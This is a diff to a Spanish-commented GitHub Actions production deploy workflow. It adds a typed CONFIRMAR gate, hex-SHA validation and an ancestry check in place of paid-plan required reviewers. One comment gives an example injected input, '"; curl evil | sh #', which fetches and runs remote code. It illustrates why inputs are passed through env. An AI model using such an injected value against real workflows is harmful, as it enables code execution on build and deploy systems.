@@ -10,12 +10,25 @@ name: Deploy a produccion
 # pull_request. Un push accidental a main jamas dispara un deploy por si
 # solo.
 #
-# El job "deploy" usa el Environment "production" de GitHub. ESO REQUIERE
-# UNA CONFIGURACION EXTERNA QUE ESTE ARCHIVO NO PUEDE HACER POR SI SOLO:
-# en GitHub -> Settings -> Environments -> production, agregar
-# "Required reviewers" (al menos el dueno de KOREX.IA). Sin esa
-# configuracion manual, el Environment existe pero no bloquea nada — se
-# documenta aqui explicitamente en vez de asumir que ya esta hecho.
+# Fase 10N-G — GitHub Free en un repo PRIVADO no ofrece "Required
+# reviewers" dentro de un Environment (es una funcion de Pro/Team/
+# Enterprise para repos privados). NO se asume esa proteccion. En su
+# lugar, la autorizacion explicita vive DENTRO del propio workflow, con
+# tres capas que no dependen de ningun plan de pago:
+#
+#   1. El input "confirm" exige escribir la palabra exacta CONFIRMAR. Se
+#      verifica del lado del servidor (dentro del job, con un `if`, no
+#      solo con `required: true` en el formulario) — la UI de GitHub NO
+#      es la barrera, es solo la forma de escribirlo.
+#   2. El input "commit_sha" se valida en el propio workflow Y en
+#      scripts/deploy.sh: debe ser un SHA hexadecimal de 7-40 caracteres
+#      (nunca un nombre de rama/tag/HEAD — una rama es un puntero mutable,
+#      un SHA no) Y debe ser un ancestro real de origin/main.
+#   3. `environment: production` se mantiene de todos modos: aunque este
+#      plan no bloquee con revisores, un Environment SI sigue separando
+#      los secretos (DEPLOY_SSH_KEY/DEPLOY_SSH_HOST) de cualquier otro
+#      workflow o job que no lo declare — esa parte de Environments es
+#      gratis en cualquier plan, para repos privados.
 #
 # Fase 10N-D (revision pre-commit) — SEGURIDAD: ningun `${{ inputs.* }}` ni
 # `${{ secrets.* }}` se interpola directamente dentro de un bloque `run:`.
@@ -23,13 +36,17 @@ name: Deploy a produccion
 # ANTES de que el shell lo vea — un commit_sha malicioso tipo
 # `"; curl evil | sh #` se ejecutaria literalmente. Todo pasa por `env:` y
 # se referencia como variable de shell (`"$COMMIT_SHA"`), que es sustitucion
-# seria del shell, no de la plantilla. Se trata cada input como no confiable.
+# real del shell, no de la plantilla. Se trata cada input como no confiable.
 
 on:
   workflow_dispatch:
     inputs:
       commit_sha:
-        description: "Commit SHA a desplegar (debe ser ancestro de origin/main)"
+        description: "Commit SHA EXACTO a desplegar (7-40 caracteres hex, NUNCA una rama/tag) — debe ser ancestro de origin/main"
+        required: true
+        type: string
+      confirm:
+        description: "Escribe exactamente CONFIRMAR (mayusculas) para autorizar el despliegue a produccion"
         required: true
         type: string
       allow_worker_enabled:
@@ -49,17 +66,29 @@ jobs:
     env:
       COMMIT_SHA: ${{ inputs.commit_sha }}
     steps:
+      - name: Validar formato del commit ANTES de tocar el repo
+        run: |
+          if ! printf '%s' "$COMMIT_SHA" | grep -Eq '^[0-9a-fA-F]{7,40}$'; then
+            echo "::error::commit_sha debe ser un SHA hexadecimal de 7-40 caracteres, nunca una rama/tag/HEAD. Recibido: '$COMMIT_SHA'"
+            exit 1
+          fi
+
       - name: Checkout del commit solicitado
         uses: actions/checkout@v4
         with:
           ref: ${{ inputs.commit_sha }}
           fetch-depth: 0
 
-      - name: Confirmar que el commit es ancestro de origin/main
+      - name: Confirmar que el commit checked-out es ancestro de origin/main
         run: |
+          # El paso de checkout anterior ya solo tiene EXITO si el commit
+          # solicitado existe de verdad en el repo — no hace falta comparar
+          # nada mas, `git rev-parse HEAD` es exactamente ese commit, ya
+          # resuelto.
+          RESOLVED="$(git rev-parse HEAD)"
           git fetch origin main --quiet
-          git merge-base --is-ancestor "$COMMIT_SHA" origin/main || {
-            echo "::error::$COMMIT_SHA no es un ancestro de origin/main — no se despliega codigo no publicado en main."
+          git merge-base --is-ancestor "$RESOLVED" origin/main || {
+            echo "::error::$RESOLVED no es un ancestro de origin/main — no se despliega codigo no publicado en main."
             exit 1
           }
 
@@ -79,16 +108,25 @@ jobs:
       - run: pnpm build
 
   deploy:
-    name: Deploy (requiere aprobacion del Environment production)
+    name: Deploy (requiere escribir CONFIRMAR + Environment production)
     needs: build-test
     runs-on: ubuntu-latest
     environment: production
     env:
       COMMIT_SHA: ${{ inputs.commit_sha }}
+      CONFIRM_INPUT: ${{ inputs.confirm }}
       ALLOW_WORKER_ENABLED_INPUT: ${{ inputs.allow_worker_enabled }}
       DEPLOY_SSH_KEY_CONTENT: ${{ secrets.DEPLOY_SSH_KEY }}
       DEPLOY_SERVER: ${{ secrets.DEPLOY_SSH_HOST }}
     steps:
+      - name: Verificar la barrera de confirmacion explicita (server-side, no solo la UI)
+        run: |
+          if [ "$CONFIRM_INPUT" != "CONFIRMAR" ]; then
+            echo "::error::Debes escribir exactamente CONFIRMAR (mayusculas, sin espacios) en el input 'confirm' para autorizar este despliegue a produccion. No se acepta ningun otro valor."
+            exit 1
+          fi
+          echo "Confirmacion explicita verificada — procediendo con el deploy a produccion."
+
       - name: Checkout del commit solicitado
         uses: actions/checkout@v4
         with:
